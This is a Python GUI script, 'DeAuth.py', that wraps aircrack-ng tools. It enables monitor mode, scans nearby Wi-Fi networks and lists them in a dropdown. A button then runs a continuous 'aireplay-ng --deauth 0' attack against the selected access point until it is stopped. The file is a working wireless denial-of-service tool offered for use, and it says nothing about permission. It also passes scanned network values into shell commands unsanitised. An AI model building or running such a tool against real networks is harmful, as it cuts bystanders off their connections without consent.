import tkinter as tk
from tkinter import ttk, messagebox
import subprocess
import threading
import os
import time

class DeAuthTool:
    def __init__(self, root):
        self.root = root
        self.root.title("DeAuth.py")
        self.root.geometry("600x650")  # Adjusted height for the taller output box
        self.root.resizable(False, False)  # Make the window non-resizable
        self.root.configure(bg="white")
        
        # Grid configuration for responsiveness
        self.root.grid_rowconfigure(0, weight=0)
        self.root.grid_rowconfigure(1, weight=0)
        self.root.grid_rowconfigure(2, weight=1)
        self.root.grid_rowconfigure(3, weight=0)
        self.root.grid_columnconfigure(0, weight=1)
        
        # Initialize global variables
        self.scanning = False
        self.networks = []
        self.scan_process = None  # Global variable to hold the scan process
        
        # GUI Elements
        self.create_widgets()
        
        # Automatically start wlan0mon on tool launch
        self.start_wlan0mon()
        self.root.protocol("WM_DELETE_WINDOW", self.on_close)

    def create_widgets(self):
        # Frame for buttons
        button_frame = tk.Frame(self.root, bg="white")
        button_frame.grid(row=0, column=0, padx=20, pady=20, sticky="nsew")
        button_frame.grid_rowconfigure(0, weight=1)
        button_frame.grid_rowconfigure(1, weight=1)
        button_frame.grid_rowconfigure(2, weight=1)
        button_frame.grid_rowconfigure(3, weight=1)
        button_frame.grid_rowconfigure(4, weight=1)
        button_frame.grid_columnconfigure(0, weight=1)
        
        self.check_button = tk.Button(button_frame, text="Check wlan0mon", command=self.check_wlan0mon, bg="orange", fg="white", font=("Arial", 12, "bold"), height=2)
        self.check_button.grid(row=0, column=0, pady=5, padx=5, sticky="ew")
        self.check_button.bind("<Enter>", self.on_enter)
        self.check_button.bind("<Leave>", self.on_leave)
        
        self.start_scan_button = tk.Button(button_frame, text="Start Scan", command=self.start_scan, bg="orange", fg="white", font=("Arial", 12, "bold"), height=2)
        self.start_scan_button.grid(row=1, column=0, pady=5, padx=5, sticky="ew")
        self.start_scan_button.bind("<Enter>", self.on_enter)
        self.start_scan_button.bind("<Leave>", self.on_leave)
        
        self.stop_scan_button = tk.Button(button_frame, text="Stop Scan", command=self.stop_scan, bg="orange", fg="white", font=("Arial", 12, "bold"), height=2)
        self.stop_scan_button.grid(row=2, column=0, pady=5, padx=5, sticky="ew")
        self.stop_scan_button.bind("<Enter>", self.on_enter)
        self.stop_scan_button.bind("<Leave>", self.on_leave)
        
        self.start_deauth_button = tk.Button(button_frame, text="Start Deauth", command=self.start_deauth, bg="orange", fg="white", font=("Arial", 12, "bold"), height=2)
        self.start_deauth_button.grid(row=3, column=0, pady=5, padx=5, sticky="ew")
        self.start_deauth_button.bind("<Enter>", self.on_enter)
        self.start_deauth_button.bind("<Leave>", self.on_leave)
        
        self.stop_deauth_button = tk.Button(button_frame, text="Stop Deauth", command=self.stop_deauth, bg="orange", fg="white", font=("Arial", 12, "bold"), height=2)
        self.stop_deauth_button.grid(row=4, column=0, pady=5, padx=5, sticky="ew")
        self.stop_deauth_button.bind("<Enter>", self.on_enter)
        self.stop_deauth_button.bind("<Leave>", self.on_leave)
        
        # Dropdown Menu
        self.dropdown_menu = ttk.Combobox(self.root, state="readonly", font=("Arial", 10), width=50)
        self.dropdown_menu.set("Select a Network")  # Set initial text
        self.dropdown_menu.grid(row=1, column=0, padx=20, pady=10, sticky="ew")
        
        # Output Frame
        output_frame = tk.Frame(self.root, bg="lightgrey")
        output_frame.grid(row=2, column=0, pady=10, padx=20, sticky="nsew")
        
        # Scrollable Output Text Widget
        self.output_text = tk.Text(output_frame, wrap=tk.WORD, height=20, bg="white", fg="black", font=("Arial", 10))  # Increased height
        self.output_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        self.output_text.config(state=tk.DISABLED)
        
        scrollbar = tk.Scrollbar(output_frame, command=self.output_text.yview)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.output_text.config(yscrollcommand=scrollbar.set)
        
        # Footer
        footer_label = tk.Label(self.root, text="Made By Mudit", bg="white", fg="gray", font=("Arial", 10, "italic"))
        footer_label.grid(row=3, column=0, pady=10, sticky="s")
    
    def log_output(self, category, message):
        """Log output to the Text widget with category."""
        category_color = {
            "Scanned Networks": "blue",
            "Starting Attack": "green",
            "Wlan0mon Status": "purple",
            "Deauth Status": "red"
        }
        color = category_color.get(category, "black")
        self.output_text.config(state=tk.NORMAL)
        if category == "Scanned Networks":
            # Add the heading only once
            if self.output_text.get("1.0", tk.END).strip() == "":
                self.output_text.insert(tk.END, f"{'-' * 40}\nScanned Networks\n{'-' * 40}\n", (category,))
            # List networks
            self.output_text.insert(tk.END, f"{message}\n", (category,))
        else:
            self.output_text.insert(tk.END, f"{'-' * 40}\n{category}\n{'-' * 40}\n{message}\n", (category,))
        self.output_text.tag_configure(category, foreground=color)
        self.output_text.yview(tk.END)
        self.output_text.config(state=tk.DISABLED)
    
    def check_wlan0mon(self):
        result = subprocess.getoutput("iwconfig 2>/dev/null | grep wlan0mon")
        if "wlan0mon" in result:
            self.log_output("Wlan0mon Status", "wlan0mon is active.")
        else:
            self.log_output("Wlan0mon Status", "wlan0mon is not active.")
    
    def start_wlan0mon(self):
        result = subprocess.getoutput("iwconfig 2>/dev/null | grep wlan0mon")
        if "wlan0mon" not in result:
            subprocess.call("airmon-ng start wlan0", shell=True)
            self.log_output("Wlan0mon Status", "wlan0mon started.")
    
    def stop_wlan0mon(self):
        subprocess.call("airmon-ng stop wlan0mon", shell=True)
        self.log_output("Wlan0mon Status", "wlan0mon stopped.")
    
    def start_scan(self):
        self.scanning = True
        if self.scan_process is not None:
            self.scan_process.terminate()
            self.scan_process.wait()
        scan_thread = threading.Thread(target=self.scan_networks)
        scan_thread.start()
    
    def stop_scan(self):
        self.scanning = False
        if self.scan_process is not None:
            self.scan_process.terminate()
            self.scan_process.wait()
        self.log_output("Scanned Networks", "Scan stopped.")
    
    def scan_networks(self):
        self.networks = []
        self.dropdown_menu["values"] = []
        
        # Remove old scan results file if it exists
        if os.path.exists('/tmp/scan_results-01.csv'):
            os.remove('/tmp/scan_results-01.csv')
        
        scan_command = "airodump-ng wlan0mon --write-interval 1 --output-format csv --write /tmp/scan_results"
        self.scan_process = subprocess.Popen(scan_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        while self.scanning:
            try:
                if os.path.exists('/tmp/scan_results-01.csv'):
                    with open('/tmp/scan_results-01.csv', 'r') as f:
                        lines = f.readlines()[2:]  # Skip the first two header lines
                        network_list = []
                        for i, line in enumerate(lines):
                            parts = line.split(',')
                            if len(parts) > 13:
                                bssid = parts[0].strip()
                                channel = parts[3].strip()
                                ssid = parts[13].strip()
                                if bssid and ssid and (ssid, bssid, channel) not in self.networks:
                                    self.networks.append((ssid, bssid, channel))
                                    network_list.append(f"{i+1}. SSID: {ssid}, BSSID: {bssid}, Channel: {channel}")
                        if network_list:
                            self.log_output("Scanned Networks", "\n".join(network_list))
                        self.update_dropdown()
            except FileNotFoundError:
                pass
            
            time.sleep(1)
        
        self.scan_process.terminate()
    
    def update_dropdown(self):
        self.dropdown_menu["values"] = [f"{ssid} ({bssid}) - Channel {channel}" for ssid, bssid, channel in self.networks]
    
    def start_deauth(self):
        target = self.dropdown_menu.get()
        if target:
            bssid = target.split('(')[-1].split(')')[0]
            channel = target.split('Channel')[-1].strip()
            self.log_output("Starting Attack", f"Attempting to deauth BSSID: {bssid} on Channel {channel}")
            deauth_thread = threading.Thread(target=self.perform_deauth, args=(bssid, channel))
            deauth_thread.start()
        else:
            messagebox.showwarning("Warning", "Please select a network from the dropdown.")
    
    def perform_deauth(self, bssid, channel):
        self.log_output("Starting Attack", f"Starting deauthentication attack on BSSID: {bssid} on Channel {channel}")
        
        # Change to the specified channel
        subprocess.call(f"iwconfig wlan0mon channel {channel}", shell=True)
        
        # Run the deauth attack on the specified BSSID
        result = subprocess.run(f"aireplay-ng --deauth 0 -a {bssid} wlan0mon", shell=True, capture_output=True)
        if result.returncode != 0:
            self.log_output("Deauth Status", f"Deauth failed: {result.stderr.decode()}")
        else:
            self.log_output("Deauth Status", "Deauth command executed successfully")
    
    def stop_deauth(self):
        subprocess.call("killall aireplay-ng", shell=True)
        self.log_output("Deauth Status", "Deauthentication attack stopped.")
    
    def on_enter(self, e):
        e.widget.config(bg='darkorange', fg='white')
    
    def on_leave(self, e):
        e.widget.config(bg='orange', fg='white')
    
    def on_close(self):
        self.stop_wlan0mon()
        self.root.destroy()

# Run the application
root = tk.Tk()
app = DeAuthTool(root)
root.mainloop()
